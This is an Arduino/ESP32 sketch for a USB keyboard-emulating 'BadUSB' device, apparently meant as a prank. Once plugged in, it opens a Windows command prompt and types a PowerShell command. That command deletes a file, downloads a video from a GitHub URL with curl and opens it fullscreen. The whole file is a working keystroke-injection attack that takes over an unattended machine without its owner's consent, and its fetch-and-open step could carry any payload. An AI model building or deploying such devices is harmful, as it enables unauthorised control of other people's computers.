#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void typeSlowly(const String &s, int ms = 4) {
  for (size_t i = 0; i < s.length(); i++) { Keyboard.print(s[i]); delay(ms); }
}

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(4000);

  // Win + R → cmd
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r');
  delay(100); Keyboard.releaseAll();
  delay(1500);
  typeSlowly("cmd", 10);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(2500);

  // Явно указываем правильный URL: ветка main, файл video.mp4
  String cmd =
    "powershell -NoProfile -Command \""
    "$url='https://raw.githubusercontent.com/tttimirtt-spec/prank/main/main.mp4';"
    "if(Test-Path C:\\video.mp4){Remove-Item C:\\video.mp4 -Force};"
    "curl.exe -L -f -o C:\\video.mp4 $url;"
    "if((Test-Path C:\\video.mp4) -and ((Get-Item C:\\video.mp4).Length -gt 100000)){"
      "Start-Process C:\\video.mp4;"
      "Start-Sleep 4;"
      "(New-Object -ComObject WScript.Shell).SendKeys('{F11}')"
    "}else{"
      "Write-Host 'DOWNLOAD FAILED — проверь интернет или URL';"
      "Read-Host 'Нажми Enter, чтобы закрыть'"
    "}"
    "\"";

  typeSlowly(cmd, 3);
  delay(300);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
}

void loop() {}
